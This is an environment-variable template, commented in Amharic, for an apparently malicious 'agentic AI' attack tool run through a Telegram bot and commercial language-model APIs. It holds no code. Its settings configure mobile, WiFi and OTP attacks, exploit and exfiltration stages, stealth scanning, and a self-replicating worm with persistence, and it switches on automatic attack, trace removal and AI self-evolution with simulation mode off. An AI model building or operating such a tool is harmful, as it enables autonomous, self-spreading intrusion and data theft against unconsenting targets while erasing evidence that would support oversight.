# ============================================================
# 👑 ULTIMATE GOLD AGENTIC AI - ENVIRONMENT VARIABLES
# ============================================================
# ይህ ፋይል ሁሉንም አስፈላጊ የአካባቢ ተለዋዋጮች ያካትታል
# ይህንን ፋይል ወደ .env በመቀየር እውነተኛ ቁልፎችን ያስገቡ
# ============================================================

# ============================================================
# 1. የስርዓት መሰረታዊ ቅንብሮች (System Basics)
# ============================================================

# የአፕሊኬሽን ስም
APP_NAME="Ultimate Gold Agentic AI"

# የአፕሊኬሽን ስሪት
APP_VERSION="3.0.0"

# የስርዓት አካባቢ (production, development, testing)
ENVIRONMENT="production"

# የማስተካከያ ሁነታ (true/false)
DEBUG="false"

# የሚስጥር ቁልፍ (ለFlask እና ለምስጠራ)
SECRET_KEY="change-this-to-a-random-secret-key-32-chars-minimum"

# የሂደት ስም (ለሎግ እና ለክትትል)
PROCESS_NAME="gold_ai_main"

# ============================================================
# 2. የማህደር መንገዶች (Directory Paths)
# ============================================================

# የውሂብ ማህደር (Database, cache, etc.)
DATA_DIR="./data"

# የሎግ ማህደር
LOG_DIR="./logs"

# የጊዜያዊ ፋይሎች ማህደር
TEMP_DIR="./temp"

# ============================================================
# 3. የቴሌግራም ቦት ቅንብሮች (Telegram Bot)
# ============================================================

# ⚠️ ይህ ቁልፍ አስፈላጊ ነው! ከBotFather ያግኙት
TELEGRAM_BOT_TOKEN="your_telegram_bot_token_here"

# የWebApp URL (በReplit ላይ ሲሰራ በራስ ይሞላል)
WEBAPP_URL="https://your-repl-name.your-username.repl.co"

# የWebhook URL (ለማስመሰል ካልሆነ አያስፈልግም)
WEBHOOK_URL=""

# ============================================================
# 4. API ቁልፎች (API Keys)
# ============================================================

# ----- 4.1 OpenAI API -----
# ከ https://platform.openai.com/api-keys ያግኙት
# ⚠️ አማራጭ ነው ነገር ግን መጠቀም ይመከራል
OPENAI_API_KEY="sk-your-openai-api-key-here"

# የOpenAI ድርጅት ID (ካለ)
OPENAI_ORGANIZATION=""

# ----- 4.2 DeepSeek API -----
# ከ https://platform.deepseek.com/api_keys ያግኙት
# ⚠️ አማራጭ ነው
DEEPSEEK_API_KEY="sk-your-deepseek-api-key-here"

# ----- 4.3 OpenRouter API -----
# ከ https://openrouter.ai/keys ያግኙት
# ⚠️ አማራጭ ነው
OPENROUTER_API_KEY="sk-your-openrouter-api-key-here"

# ============================================================
# 5. የደህንነት ቅንብሮች (Security)
# ============================================================

# የምስጠራ ቁልፍ (ከ32 ቁምፊ በላይ)
ENCRYPTION_KEY="change-this-to-a-strong-encryption-key"

# የተፈቀዱ አስተዳዳሪዎች (በነጠላ ሰረዝ የተለዩ)
ADMIN_USERS="user1,user2,user3"

# የተፈቀዱ IP አድራሻዎች (* ሁሉንም ይፈቅዳል)
ALLOWED_IPS="*"

# የተከለከሉ IP አድራሻዎች
BLOCKED_IPS=""

# የጥያቄ ገደብ (በደቂቃ ስንት ጥያቄዎች)
RATE_LIMIT_REQUESTS="100"

# የጥያቄ ገደብ ጊዜ (በሰከንዶች)
RATE_LIMIT_PERIOD="60"

# ============================================================
# 6. የውሂብ ጎታ ቅንብሮች (Database)
# ============================================================

# የውሂብ ጎታ አይነት (sqlite, postgresql, mysql)
DB_TYPE="sqlite"

# SQLite መንገድ (ለsqlite ብቻ)
SQLITE_PATH="./gold_ai.db"

# PostgreSQL DSN (ለpostgresql ብቻ)
# DATABASE_URL="postgresql://user:password@localhost:5432/gold_ai"

# MySQL DSN (ለmysql ብቻ)
# DATABASE_URL="mysql://user:password@localhost:3306/gold_ai"

# ============================================================
# 7. የሎግ ቅንብሮች (Logging)
# ============================================================

# የሎግ ደረጃ (DEBUG, INFO, WARNING, ERROR, CRITICAL)
LOG_LEVEL="INFO"

# የሎግ ቅርጸት (simple, detailed, json)
LOG_FORMAT="detailed"

# የሎግ ማቆያ ጊዜ (በቀናት)
LOG_RETENTION_DAYS="7"

# ============================================================
# 8. የጥቃት ቅንብሮች (Attack Settings)
# ============================================================

# ከፍተኛ የሙከራ ብዛት
MAX_RETRIES="3"

# የሙከራ መዘግየት (በሰከንዶች)
RETRY_DELAY="1.0"

# አጠቃላይ የጊዜ ገደብ (በሰከንዶች)
GLOBAL_TIMEOUT="3600"

# ----- 8.1 ሞባይል ጥቃት (Level 1) -----
MOBILE_PHONE_TIMEOUT="86400"   # 24 ሰአታት
MOBILE_WIFI_TIMEOUT="1800"     # 30 ደቂቃ
MOBILE_OTP_DELAY="60"          # 1 ደቂቃ
MOBILE_MAX_ATTEMPTS="100"

# ----- 8.2 መደበኛ ሰርቨር (Level 2) -----
STANDARD_SCAN_TIMEOUT="300"    # 5 ደቂቃ
STANDARD_EXPLOIT_TIMEOUT="60"
STANDARD_EXFIL_TIMEOUT="30"

# ----- 8.3 Gold Level (Level 3) -----
GOLD_RECON_TIMEOUT="3600"      # 1 ሰአት
GOLD_EXPLOIT_TIMEOUT="7200"    # 2 ሰአታት
GOLD_EXFIL_TIMEOUT="1800"      # 30 ደቂቃ
GOLD_SLEEP_BETWEEN="10.0"      # በሰከንዶች
GOLD_JITTER="5.0"              # የዘፈቀደ መጠን

# ============================================================
# 9. የዎርም ቅንብሮች (Worm Settings)
# ============================================================

# የዎርም መባዛት ክፍተት (በሰከንዶች)
WORM_REPLICATION_INTERVAL="300"

# ከፍተኛ የዎርም ሰራተኞች
WORM_MAX_WORKERS="200"

# የዎርም ፖርቶች
WORM_SCAN_PORTS="22,80,443,445,3389,5000,8080,8443,9000"

# የዎርም ቀጣይነት (true/false)
WORM_PERSISTENCE="true"

# ራስ-ማስወገድ (true/false)
WORM_AUTO_REMOVE="true"

# ============================================================
# 10. የAI ቅንብሮች (AI Settings)
# ============================================================

# ----- 10.1 AI ሞዴሎች -----
AI_PRIMARY_MODEL="gpt-4o-mini"
AI_SECONDARY_MODEL="deepseek-chat"
AI_FALLBACK_MODEL="meta-llama/llama-3.2-3b-instruct:free"

# ----- 10.2 AI ጥያቄ ቅንብሮች -----
AI_TEMPERATURE="0.3"
AI_MAX_TOKENS="300"
AI_TOP_P="0.9"
AI_FREQUENCY_PENALTY="0.0"
AI_PRESENCE_PENALTY="0.0"

# ----- 10.3 AI ትምህርት -----
AI_LEARNING_RATE="0.1"
AI_EXPLORATION_FACTOR="0.3"
AI_SUCCESS_REINFORCEMENT="0.05"
AI_FAILURE_PENALTY="0.02"

# ----- 10.4 AI ማህደረ ትውስታ -----
AI_MAX_MEMORY_SIZE="10000"
AI_MEMORY_TTL="86400"  # 24 ሰአታት

# ----- 10.5 የኢንተርኔት ትምህርት -----
AI_INTERNET_LEARNING="true"
AI_INTERNET_LEARNING_TIMEOUT="5.0"
AI_MAX_INTERNET_SOURCES="5"

# ----- 10.6 ራስ-ማሻሻል -----
AI_AUTO_EVOLUTION="true"
AI_EVOLUTION_CHECK_INTERVAL="3600"
AI_MAX_EVOLUTION_GENERATIONS="100"

# ============================================================
# 11. የAPI ቅንብሮች (API Integration)
# ============================================================

# ----- 11.1 OpenAI -----
OPENAI_ENABLED="true"
OPENAI_TIMEOUT="30.0"
OPENAI_MAX_RETRIES="3"

# ----- 11.2 DeepSeek -----
DEEPSEEK_ENABLED="true"
DEEPSEEK_TIMEOUT="30.0"
DEEPSEEK_MAX_RETRIES="3"

# ----- 11.3 OpenRouter -----
OPENROUTER_ENABLED="true"
OPENROUTER_TIMEOUT="30.0"
OPENROUTER_MAX_RETRIES="3"
OPENROUTER_MODELS="meta-llama/llama-3.2-3b-instruct:free,mistralai/mistral-7b-instruct:free,anthropic/claude-3-haiku"

# ----- 11.4 የጋራ ቅንብሮች -----
API_USE_CONSENSUS="true"
API_CONSENSUS_THRESHOLD="2"
API_FALLBACK_TO_SINGLE="true"

# ============================================================
# 12. የአውታረ መረብ ቅንብሮች (Network)
# ============================================================

# ነባር ፖርቶች
DEFAULT_PORTS="21,22,25,53,80,110,143,443,993,995,3306,3389,5432,5900,6379,8080,8443,9000"

# የቅኝት ጊዜ ገደብ (በሰከንዶች)
SCAN_TIMEOUT="1.0"

# የስውር ቅኝት ጊዜ ገደብ
STEALTH_SCAN_TIMEOUT="5.0"

# ከፍተኛ የቅኝት ሰራተኞች
MAX_SCAN_WORKERS="100"

# DNS ጊዜ ገደብ
DNS_TIMEOUT="3.0"

# HTTP ጊዜ ገደብ
HTTP_TIMEOUT="5.0"

# ============================================================
# 13. የዳሽቦርድ እና UI ቅንብሮች (UI)
# ============================================================

# ጭብጥ (dark, light, matrix)
UI_THEME="dark"

# ተጨማሪ ቀለም
UI_ACCENT_COLOR="#00ff41"

# ወርቃማ ቀለም
UI_GOLD_ACCENT="#ffd700"

# የፓነል ክፍሎች
UI_SHOW_REALTIME_LOGS="true"
UI_SHOW_ATTACK_HISTORY="true"
UI_SHOW_CAPABILITIES="true"
UI_SHOW_SYSTEM_STATUS="true"

# ተለዋዋጭ ፓነል
UI_ALLOW_DYNAMIC_PANEL="true"
UI_MAX_PANEL_SECTIONS="20"

# ቋንቋ (am, en)
UI_DEFAULT_LANGUAGE="am"
UI_SUPPORTED_LANGUAGES="am,en"

# ============================================================
# 14. የባህሪ ቁጥጥር (Feature Flags)
# ============================================================

# ራስ-ማሻሻል ባህሪ
ENABLE_EVOLUTION="true"

# የኢንተርኔት ትምህርት
ENABLE_INTERNET_LEARNING="true"

# የዎርም ማሰማራት
ENABLE_WORM="true"

# ፍንጭ ማጥፋት
ENABLE_TRACE_REMOVAL="true"

# ራስ-ማጥቃት
ENABLE_AUTO_ATTACK="true"

# ============================================================
# 15. የሙከራ እና ልማት ቅንብሮች (Testing & Development)
# ============================================================

# የሙከራ ሁነታ (true/false)
TEST_MODE="false"

# የማስመሰል ሁነታ (true/false) - እውነተኛ ጥቃቶችን ያስቆማል
SIMULATION_MODE="false"

# የሙከራ ዒላማ
TEST_TARGET="127.0.0.1"

# የሙከራ ፖርቶች
TEST_PORTS="80,443"

# ============================================================
# 16. የማሳወቂያ ቅንብሮች (Notification)
# ============================================================

# የማሳወቂያ አድራሻ (ኢሜል ወይም ቴሌግራም)
NOTIFICATION_EMAIL="admin@example.com"

# የማሳወቂያ ዘዴ (email, telegram, both)
NOTIFICATION_METHOD="telegram"

# የማሳወቂያ ደረጃ (all, critical, none)
NOTIFICATION_LEVEL="critical"

# ============================================================
# 17. የተለያዩ (Miscellaneous)
# ============================================================

# የጊዜ ሰቅ (Timezone)
TIMEZONE="Africa/Addis_Ababa"

# የኩኪ ጊዜ ማቆያ (በሰከንዶች)
SESSION_TIMEOUT="86400"

# ከፍተኛ የፋይል መጠን (በኤምቢ)
MAX_FILE_SIZE="50"

# ============================================================
# 🏆 ማስታወሻ: እውነተኛ ቁልፎችን ሳያስገቡ ይህን ፋይል አታስቀምጡ!
# ይህን ፋይል ወደ .env በመቀየር ቁልፎችን ያስገቡ
# ============================================================
